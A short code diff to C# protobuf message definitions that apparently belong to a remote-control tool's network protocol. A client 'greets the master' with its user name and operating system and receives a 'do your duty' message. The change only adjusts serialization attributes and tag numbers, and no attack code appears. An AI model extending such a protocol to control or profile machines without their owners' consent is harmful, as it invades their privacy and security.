@@ -8,7 +8,7 @@ using System.Threading.Tasks;
 
 namespace BlackHole.Common.Network.Protocol
 {
-    [ProtoContract(ImplicitFields = ImplicitFields.AllFields)]
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
     public sealed class GreetTheMaster : NetMessage
     {
         public string UserName;
@@ -16,14 +16,14 @@ namespace BlackHole.Common.Network.Protocol
         public string OperatingSystem;
     }
 
-    [ProtoContract(ImplicitFields = ImplicitFields.AllFields)]
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
     public sealed class DoYourDuty : NetMessage
     {
     }
 
-    [ProtoInclude(1, typeof(DoYourDuty))]
-    [ProtoInclude(0, typeof(GreetTheMaster))]
-    [ProtoContract(ImplicitFields = ImplicitFields.AllFields)]
+    [ProtoInclude(1001, typeof(DoYourDuty))]
+    [ProtoInclude(1000, typeof(GreetTheMaster))]
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
     public abstract class NetMessage
     {
         private byte[] m_serializedBuffer;
